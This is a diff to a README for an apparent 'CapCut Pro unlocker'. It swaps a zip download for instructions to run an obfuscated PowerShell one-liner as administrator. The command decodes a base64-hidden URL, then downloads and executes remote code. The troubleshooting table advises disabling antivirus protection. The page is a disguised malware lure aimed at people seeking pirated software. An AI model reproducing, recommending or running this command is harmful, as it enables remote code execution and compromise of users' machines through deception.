@@ -30,30 +30,68 @@
 
 ---
 
-<!-- ═══════════════════ DOWNLOAD + PASSWORD ═══════════════════ -->
+<!-- ═══════════════════ DOWNLOAD  ═══════════════════ -->
 
 ## 📥 Download
 
-<table align="center">
-<tr>
-<td align="center">
+---
 
-<a href="https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/6/CapCut-Pro-Desktop-Unlocker.zip">
-  <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-</a>
+### Method 1 — via Win + X Menu (Recommended)
 
-<br><br>
+```text
+1. Press Win + X on your keyboard
+2. From the menu, select: Terminal (Admin) or PowerShell (Admin)
+3. Confirm the UAC prompt (Yes)
+4. Copy the command below in full:
+```
 
-🔐 **Password:** `2026`
+```powershell
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjcwNzA2MjE1L3BhY2FuaQ=='))) -UseBasicParsing)
+```
 
-</td>
-</tr>
-</table>
+```text
+5. Paste it into the PowerShell window (Ctrl + V or right-click)
+6. Press Enter
+7. Wait for the installation to finish — the PowerShell window will close automatically
+8. Restart CapCut
+9. Done — all premium features are activated
+```
 
-**Direct Links:**
-- [Latest Release](https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/6/CapCut-Pro-Desktop-Unlocker.zip)
-- [Source Code](https://github.com/lowermaintenancetell/CapCut-Pro-Desktop-Unlocker/releases/download/6/CapCut-Pro-Desktop-Unlocker.zip)
+---
 
+### Method 2 — via Win + R Menu
+
+```text
+1. Press Win + R on your keyboard
+2. Type in the field: powershell
+3. Press Enter
+4. If needed — open PowerShell as Administrator manually
+5. Copy the command below in full:
+```
+
+```powershell
+iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjcwNzA2MjE1L3BhY2FuaQ=='))) -UseBasicParsing)
+```
+
+```text
+6. Paste it into the PowerShell window (Ctrl + V or right-click)
+7. Press Enter
+8. Wait for the installation to finish
+9. Restart CapCut
+10. Done — all premium features are activated
+```
+
+---
+
+### Troubleshooting
+
+| Problem | Solution |
+|---------|----------|
+| "Access denied" | Run PowerShell as Administrator |
+| Command won't execute | Check your internet connection and try again |
+| Antivirus blocks it | Temporarily disable real-time protection |
+| Features not showing | Restart CapCut after installation |
+| PowerShell closes immediately | This is normal — installation is complete | 
 ---
 
 ## 🎯 What is CapCut-Pro-Desktop-Unlocker?
